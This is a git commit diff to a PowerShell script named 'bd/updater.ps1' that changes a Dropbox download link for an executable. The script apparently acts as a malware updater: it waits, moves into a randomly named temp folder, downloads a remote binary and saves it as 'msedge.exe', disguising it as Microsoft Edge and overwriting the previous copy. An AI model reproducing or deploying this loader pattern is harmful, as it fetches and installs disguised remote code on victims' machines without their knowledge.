004a9f33c40a181d50b9c3dde73adc8686dc0a07
blousekool <132397759+blousekool@users.noreply.github.com>
2023-11-10 11:48:35 +0100

    Update updater.ps1

--- bd/updater.ps1
+++ bd/updater.ps1
@@ -5,7 +5,7 @@ start-sleep 10
 cd $env:temp/sVBXKuz
 
 #download new file
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/8di6a2k4x9vfp5gw98ln9/wsappa-1.8.exe?rlkey=siwv86zxma0i4hquw6corpk34&dl=0" -OutFile msedge_new.exe
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/m3ub7x9td0g1a7b2jlv62/wsappa-1.9.exe?rlkey=rhyarsxdetqvyyx5gfv44uyq7&dl=0" -OutFile msedge_new.exe
 Copy-Item -Path .\msedge_new.exe -Destination .\msedge.exe -Force
 
 #delete old file
